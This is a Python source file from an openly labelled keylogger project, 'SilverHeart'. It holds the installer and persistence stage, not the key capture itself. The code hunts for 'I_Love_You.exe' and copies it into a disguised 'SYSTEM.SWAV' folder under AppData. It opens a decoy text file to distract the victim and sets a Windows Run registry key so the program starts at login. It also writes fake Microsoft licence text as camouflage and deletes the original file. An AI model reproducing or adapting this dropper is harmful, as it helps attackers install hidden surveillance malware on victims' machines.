""" A software fully developed in Python 3.7, SilverHeart is a keylogger concept, that can be deployed in Windows. (Mac OS and Linux distributions support will be added soon).
    Copyright (C) 2020 Pedro Vieira

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>. 
"""

# ------------------------------------------------------------------------------------------
#   Fundamental Changes must me made for the proper function of this code
#   The code bellow is the legacy code for Windows with slight changes
# ------------------------------------------------------------------------------------------

import os
import platform
import shutil
import subprocess
from winreg import *

# Searchs the whole computer for the file


def finder(name, pathS):
    for root, dirs, files in os.walk(pathS):
        if name in files:
            global pathF, pathB
            pathB = os.path.join(root)
            pathF = os.path.join(root, name)
            return os.path.join(root, name)
        else:
            global FileNotFound
            FileNotFound = True


def cleaner(name, pathC):
    if os.path.isfile(os.path.join(pathC, name)) is False:
        try:
            # Creates the decoy file
            with open(pathDecoy, 'w') as file:
                file.write('<3')
                file.close()

            try:
                shutil.copy(src, dst)
                print('[!] File Copied to safe place')
            except OSError as E:
                print('[!] Exception file not copied: ', str(E))

            # Opens Decoy File when parent script clicked
            if platform.system() == 'Windows':  # Windows
                os.startfile(pathDecoy)
            elif platform.system() == 'Darwin':  # MacOS
                subprocess.Popen(['start', pathDecoy])
            else:  # Linux
                subprocess.Popen(['xdg-open', pathDecoy])

            # Windows only
            # Try stock access rights with 64bits program to 64bit registry
            try:
                key = OpenKey(HKEY_CURRENT_USER, path,
                              0, access=KEY_ALL_ACCESS)
                SetValueEx(key, 'Registry', 0, REG_SZ, filePath)
                CloseKey(key)
            except FileNotFoundError:

                bits = platform.architecture()[0]

                # https://docs.microsoft.com/en-us/windows/desktop/WinProg64/accessing-an-alternate-registry-view
                if bits == '32bits':
                    access_right = KEY_WOW64_64KEY
                if bits == '64bits':
                    access_right = KEY_WOW64_32KEY

                try:
                    key = OpenKey(HKEY_CURRENT_USER, path, 0,
                                  access=KEY_ALL_ACCESS | access_right)
                    SetValueEx(key, 'Registry', 0, REG_SZ, filePath)
                    CloseKey(key)
                except Exception as e:
                    print(
                        '[!] Exception registry key could not be set: %s' % str(e))
        except FileNotFoundError:
            print('[!] File security file not found.')


UserName = os.getlogin()

path = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
filePath = 'C:\\Users\\' + UserName + \
    '\\AppData\\Roaming\\Microsoft\\SYSTEM.SWAV\\cleaner_registry.exe'
dst = 'C:\\Users\\' + UserName + '\\AppData\\Roaming\\Microsoft\\SYSTEM.SWAV'
dst2 = dst + '\\Am0ASk2'
safeFile = dst + "\\CleanerRegistry.log"

finder('I_Love_You.exe', 'C:\\')
if FileNotFound is True:
    finder('I_Love_You.exe', 'D:\\')

src = pathF
pathDecoy = os.path.join(pathB, 'I_Love_You.txt')
pathCleanerIdentity = safeFile

# Removes the origin file in the next startup
if os.path.exists(safeFile) is True:
    try:
        os.remove(src)
    except OSError:
        pass

try:
    os.mkdir(dst)
    os.mkdir(dst2)
except OSError:
    print('[!] Could not create %s' % dst, 'directory.')
else:
    print('[+] %s ' % dst, 'created succssfully!')
    cleaner('CleanerRegistry.log', dst)

# Creates one file that will be trigger a cleaner function
with open(pathCleanerIdentity, 'w') as file:
    file.write(
        'This file is based on or incorporates material from the projects listed below\n'
        '(collectively, Third Party Code). Microsoft is not the original author of the\n'
        'Third Party Code. The original copyright notice and the license, under which Microsoft\n'
        'received such Third Party Code, are set forth below. Such licenses and notices are\n'
        'provided for informational purposes only. Microsoft, not the third party, licenses\n'
        'the Third Party Code to you under the terms set forth in the EULA for the Microsoft Product.\n'
        'Microsoft reserves all other rights not expressly granted under this agreement, whether by implication,\n'
        'estoppel or otherwise.'
    )
    file.flush()
    file.close()
